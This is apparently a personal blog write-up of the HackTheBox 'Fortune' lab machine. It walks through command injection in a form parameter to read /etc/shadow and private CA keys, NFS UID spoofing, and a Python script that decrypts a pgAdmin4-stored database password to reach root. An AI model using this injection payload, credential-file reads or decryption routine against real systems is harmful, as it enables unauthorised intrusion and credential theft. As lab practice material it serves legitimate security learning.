---
title: "HackTheBox - WriteUp 11"
date: 2019-07-05T19:10:22+08:00
description: "HackTheBox 练手"
featuredImage: "https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp"
categories: ["tech"]
draft: false
displayInMenu: false
displayInList: true
dropCap: false
---

# Fortune

## User

Nmap it: 22,80,443.

Then, Access 80. Burpsuite, try to submit the form, found a POST at `/select` with `db=blahblah`, This param included RCE, modify the request like this: `db=blah;cat /etc/shadow`, you'll get the response.

Found a user called `charlie`, `bob`, `nfsuser`. Then use the RCE we just found to read two files:

- /home/bob/ca/intermediate/private/intermediate.key.pem
- /home/bob/ca/intermediate/certs/intermediate.cert.pem

Then use this to create a cert: `openssl pkcs12 -inkey intermediate.key.pem -in intermediate.cert.pem -export -out inter_pfx.pfx`, and then import this certificate to your browser.

> https://www.openbsd.org/faq/pf/authpf.html

Finally, access the 443 port and get the RSA keys of SSH, then login as `nasuser` with the key you've just get. Keep the connection alive to let you continue your operation.

Nmap again, you'll find the NFS port is opened. Then `apt install nfs-common -y`, enum the nfs share with `nmap -oN fortune.nfsshowmount.nmap --script=nfs-showmount 10.10.10.127`, you'll get home shared. Mount the NFS using `mount.nfs 10.10.10.127:/home /mnt/nfs1`. NFS has a UID mapping. So create a user with UID 1000, access `/mnt/nfs1/charlie`, then you have the `user.txt`.

## Root

After that, the home folder contains a file called `mbox`, this is a mail archive telling you that dba password is the same as the root.

Check the process list, you will find postgresql and `pgadmin4`. Check `/var/appsrv/pgadmin4`, there is a `PGAdmin4 V3.4` here, but installed on `/usr/local/pgadmin4`, check the folder, from the `<PGADMIN4>/web/utils/crypto.py`, you will find how to decrypt the hash we will got.

Then, at `/var/appsrv/pgadmin4/pgadmin4.db`, use `select * from server;`, the hash you've found is the hashed key of dba, and this hash is encrypted using AES-128-CFB, ciphertext is encoded in base64 with IV attached.

The encrypt password is the logged-in user's password, use `select * from user;`, just use the bob's hashed password as the encryption password, and decrypt. Decryptor Script as below:

```python
#!/usr/bin/env python3

import base64
import hashlib

from Crypto import Random
from Crypto.Cipher import AES

padding_string = b'}'

def pad(key):
    """Add padding to the key."""

    global padding_string
    str_len = len(key)

    # Key must be maximum 32 bytes long, so take first 32 bytes
    if str_len > 32:
        return key[:32]

    # If key size id 16, 24 or 32 bytes then padding not require
    if str_len == 16 or str_len == 24 or str_len == 32:
        return key

    # Convert bytes to string (python3)
    if not hasattr(str, 'decode'):
        padding_string = padding_string.decode()

    # Add padding to make key 32 bytes long
    return key + ((32 - str_len % 32) * padding_string)

    
def decrypt(ciphertext, key):
    """
    Decrypt the AES encrypted string.
    Parameters:
        ciphertext -- Encrypted string with AES method.
        key        -- key to decrypt the encrypted string.
    """

    global padding_string

    ciphertext = base64.b64decode(ciphertext)
    iv = ciphertext[:AES.block_size]
    cipher = AES.new(pad(key), AES.MODE_CFB, iv)
    decrypted = cipher.decrypt(ciphertext[AES.block_size:])

    return decrypted
    

cept = "utUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGz".encode()
key4aes = "$pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg".encode()
print(decrypt(cept,key4aes).decode())
```

The decrypted password is: `R3us3-0f-a-P4ssw0rdl1k3th1s?_B4D.ID3A!`

Then `su root` and do anything you want.

(END)

